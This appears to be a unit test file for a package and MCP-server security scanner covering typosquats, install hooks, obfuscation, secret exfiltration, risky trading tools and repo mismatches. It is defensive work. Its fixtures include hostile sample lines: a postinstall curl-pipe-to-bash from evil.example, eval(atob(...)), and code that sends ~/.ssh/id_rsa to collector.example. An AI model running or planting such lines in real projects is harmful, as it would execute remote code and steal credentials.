"""Unit tests for scripts/security_scan.py checkers (no network).
Run: python3 -m unittest discover -s tests -p 'test_security_scan.py'"""
import importlib.util
import os
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
spec = importlib.util.spec_from_file_location(
    "security_scan", os.path.join(ROOT, "scripts", "security_scan.py")
)
S = importlib.util.module_from_spec(spec)
spec.loader.exec_module(S)


def findings_of(fn, path, text, *args):
    out = []
    fn(path, text, out, *args)
    return out


class Levenshtein(unittest.TestCase):
    def test_distance(self):
        self.assertEqual(S.levenshtein("requests", "requests"), 0)
        self.assertEqual(S.levenshtein("requests", "reqeusts"), 2)
        self.assertEqual(S.levenshtein("lodash", "lodahs"), 2)
        self.assertEqual(S.levenshtein("axios", "axois"), 2)

    def test_typo_of_classic(self):
        self.assertEqual(S.typo_of("reqeusts", S.POPULAR_PYPI)[0], "requests")
        self.assertIsNone(S.typo_of("requests", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("requests-oauthlib", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("@types/node", S.POPULAR_NPM))
        self.assertIsNone(S.typo_of("lodash-es", S.POPULAR_NPM))  # prefix of lodash? lodash-es starts with lodash-
        self.assertIsNone(S.typo_of("httpx2", S.POPULAR_PYPI))
        # actual typo
        hit = S.typo_of("reqests", S.POPULAR_PYPI)
        self.assertIsNotNone(hit)
        self.assertEqual(hit[0], "requests")


class InstallScripts(unittest.TestCase):
    def test_husky_is_ignored(self):
        text = '{"scripts": {"prepare": "husky", "postinstall": "husky install"}}'
        self.assertEqual(findings_of(S.check_package_json, "package.json", text), [])

    def test_curl_pipe_postinstall_is_high_or_malicious(self):
        text = '{"scripts": {"postinstall": "curl https://evil.example/x.sh | bash"}}'
        fs = findings_of(S.check_package_json, "package.json", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertIn(fs[0]["severity"], ("high", "malicious"))

    def test_setup_py_cmdclass(self):
        text = "from setuptools.command.install import install\ncmdclass = {'install': C}\n"
        fs = findings_of(S.check_setup_py, "setup.py", text)
        self.assertEqual(fs[0]["check"], "install-scripts")
        self.assertEqual(fs[0]["severity"], "medium")


class CurlPipe(unittest.TestCase):
    def test_dockerfile_pipe(self):
        text = "RUN curl -fsSL https://unknown-host.example/install.sh | sh\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertTrue(any(f["check"] == "curl-pipe" for f in fs))
        self.assertTrue(any(f["severity"] in ("medium", "high") for f in fs))

    def test_known_host_is_low(self):
        text = "RUN curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "Dockerfile", text)
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "low")


class Obfuscation(unittest.TestCase):
    def test_eval_atob(self):
        text = 'const x = eval(atob("YWxlcnQoMSk="));\n'
        fs = findings_of(S.check_obfuscation, "src/index.js", text)
        self.assertTrue(any(f["check"] == "obfuscation" and f["severity"] == "high" for f in fs))

    def test_skips_dist_bundle(self):
        line = "var a=" + "x" * 600 + ";function(){}"
        fs = findings_of(S.check_obfuscation, "dist/bundle.js", line)
        self.assertEqual(fs, [])

    def test_long_minified_line_in_src(self):
        line = "var a=" + "x;" * 300
        fs = findings_of(S.check_obfuscation, "src/app.js", line)
        self.assertTrue(any(f["check"] == "obfuscation" for f in fs))


class Secrets(unittest.TestCase):
    def test_ssh_plus_unknown_host_is_malicious(self):
        text = 'open(os.path.expanduser("~/.ssh/id_rsa"))\nrequests.post("https://collector.example/u", data=key)\n'
        fs = findings_of(S.check_secrets_and_network, "src/agent.py", text, set())
        self.assertTrue(any(f["severity"] == "malicious" for f in fs), fs)

    def test_env_key_to_official_host_is_clean(self):
        text = 'key = os.environ["ALPACA_API_KEY"]\nrequests.get("https://api.alpaca.markets/v2/orders")\n'
        fs = findings_of(S.check_secrets_and_network, "src/client.py", text, {"alpaca.markets", "api.alpaca.markets"})
        self.assertEqual(fs, [])

    def test_seed_prompt(self):
        text = 'wallet = input("Please paste your seed phrase to continue")\n'
        fs = findings_of(S.check_secrets_and_network, "src/wallet.py", text, set())
        self.assertTrue(any(f["check"] == "permissions" and f["severity"] == "high" for f in fs), fs)

    def test_never_paste_seed_is_ignored(self):
        text = 'print("Never paste your seed phrase into this tool.")\n'
        fs = findings_of(S.check_secrets_and_network, "README.md", text, set())
        self.assertFalse(any(f["check"] == "permissions" for f in fs), fs)


class Permissions(unittest.TestCase):
    def test_community_withdraw_without_confirm(self):
        text = "def withdraw(address, amount):\n    return client.withdraw(address, amount)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs[0]["severity"], "high")

    def test_official_trade_without_confirm_is_low(self):
        text = "def place_order(symbol, qty, side):\n    return api.submit_order(symbol, qty, side)\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertEqual(fs[0]["severity"], "low")

    def test_python_kwarg_tool_name(self):
        text = 'TOOL = Tool(name="close_all_positions", description="Close everything")\n'
        fs = findings_of(S.check_permissions, "src/tools.py", text, True, "mcp", "trading-brokers")
        self.assertTrue(fs, fs)
        self.assertEqual(fs[0]["severity"], "low")

    def test_confirm_suppresses_trade_flag(self):
        text = "def place_order(symbol, qty, side, confirm=False):\n    if not confirm: return\n"
        fs = findings_of(S.check_permissions, "src/tools.py", text, False, "mcp", "crypto")
        self.assertEqual(fs, [])


class RepoUrl(unittest.TestCase):
    def test_normalize(self):
        a = S.normalize_repo_url("git+https://github.com/Alpacahq/alpaca-mcp-server.git")
        b = S.normalize_repo_url("https://github.com/alpacahq/alpaca-mcp-server/")
        self.assertEqual(a, b)

    def test_mismatch(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/evil/not-alpaca",
            "",
            ["evil"],
            fs,
            "npm",
        )
        self.assertTrue(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs), fs)

    def test_matching_repo_no_high(self):
        fs = []
        S.check_registry_match(
            "https://github.com/alpacahq/alpaca-mcp-server",
            "alpacahq",
            "https://github.com/alpacahq/alpaca-mcp-server",
            "",
            ["alpacahq"],
            fs,
            "npm",
        )
        self.assertFalse(any(f["severity"] in ("high", "medium", "malicious") for f in fs), fs)


class Status(unittest.TestCase):
    def test_table(self):
        self.assertEqual(S.status_of([]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "low")]), "clean")
        self.assertEqual(S.status_of([S.finding("x", "d", "info"), S.finding("y", "d", "medium")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "high")]), "concerns")
        self.assertEqual(S.status_of([S.finding("x", "d", "malicious"), S.finding("y", "d", "low")]), "malicious")


class Paths(unittest.TestCase):
    def test_skip_and_vendor(self):
        self.assertTrue(S.skip_path("node_modules/foo/index.js"))
        self.assertTrue(S.skip_path("src/app.min.js"))
        self.assertTrue(S.is_vendorish("dist/bundle.js"))
        self.assertFalse(S.skip_path("src/server.ts"))
        self.assertTrue(S.interesting("package.json"))
        self.assertTrue(S.interesting("Dockerfile"))
        self.assertFalse(S.interesting("package-lock.json"))


class ParseRepo(unittest.TestCase):
    def test_plain_and_subpath(self):
        self.assertEqual(
            S.parse_repo("https://github.com/alpacahq/alpaca-mcp-server"),
            ("alpacahq", "alpaca-mcp-server", None, None),
        )
        self.assertEqual(
            S.parse_repo("https://github.com/ComposioHQ/awesome-claude-skills/tree/master/invoice-organizer"),
            ("ComposioHQ", "awesome-claude-skills", "master", "invoice-organizer"),
        )
        self.assertIsNone(S.parse_repo("https://gitlab.com/x/y"))

class Publisher(unittest.TestCase):
    def test_email_and_stem(self):
        self.assertTrue(S.publisher_matches("alpacahq", ["Alpaca <info@alpaca.markets>"]))
        self.assertTrue(S.publisher_matches("OpenBB-finance", ["OpenBB Team <hello@openbb.co>"]))
        self.assertTrue(S.publisher_matches("stefanoamorelli", ["Stefano Amorelli <stefano@amorelli.tech>"]))
        self.assertTrue(S.publisher_matches("XeroAPI", ["rdemarco-xero", "eco-sdk"]))
        self.assertFalse(S.publisher_matches("coinbase", ["dingo0927@126.com"]))


class OsvPolicy(unittest.TestCase):
    def test_compromised_release_not_flagged_for_range(self):
        # axios-style short version list, declared as a caret range
        findings = []
        # pin_is_affected / compromised_release
        vuln = {"id": "MAL-2026-2307", "affected": [{"package": {"name": "axios"}, "versions": ["1.14.1"]}]}
        exact, ranges, has_fixed = S.mal_affected(vuln)
        self.assertTrue(S.compromised_release(vuln, exact, ranges, has_fixed) or len(exact) == 1)
        self.assertFalse(S.pin_is_affected(S.parse_semver("1.7.0"), exact, ranges))
        self.assertTrue(S.pin_is_affected(S.parse_semver("1.14.1"), exact, ranges))

    def test_pypi_project_page_is_not_a_repo(self):
        repo, home, authors = S.repo_from_pypi({
            "info": {"project_url": "https://pypi.org/project/mcp-server-ccxt/", "project_urls": None, "home_page": None, "author": None}
        })
        self.assertEqual(repo, "")
        fs = []
        S.check_registry_match("https://github.com/nayshins/mcp-server-ccxt", "nayshins", repo, home, authors, fs, "PyPI")
        self.assertTrue(all(f["severity"] == "low" for f in fs), fs)
        self.assertFalse(any(f["check"] == "repo-mismatch" and f["severity"] == "high" for f in fs))

if __name__ == "__main__":
    unittest.main()

